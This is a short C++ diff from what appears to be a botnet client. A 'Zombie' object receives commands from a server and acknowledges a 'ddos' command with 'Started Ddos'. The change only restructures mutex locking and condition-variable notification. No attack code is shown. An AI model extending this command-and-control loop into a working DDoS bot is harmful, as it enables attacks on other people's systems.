@@ -41,17 +41,19 @@ int main()
 			worker.detach();
 			while (true)
 			{
-				std::lock_guard guard1(mutex);
-				if (!rcvMsg.empty())
 				{
-					std::cout << rcvMsg << std::endl;
-					if (rcvMsg == "ddos")
-						Zombie.sendToSrv("Started Ddos", strlen("Started Ddos"));
-					else
-						Zombie.sendToSrv(rcvMsg.c_str(), rcvMsg.size());
-					rcvMsg.clear();
-					cv.notify_one();
+					std::lock_guard guard1(mutex);
+					if (!rcvMsg.empty())
+					{
+						std::cout << rcvMsg << std::endl;
+						if (rcvMsg == "ddos")
+							Zombie.sendToSrv("Started Ddos", strlen("Started Ddos"));
+						else
+							Zombie.sendToSrv(rcvMsg.c_str(), rcvMsg.size());
+						rcvMsg.clear();
+					}
 				}
+				cv.notify_one();
 			}
 		}
 		else
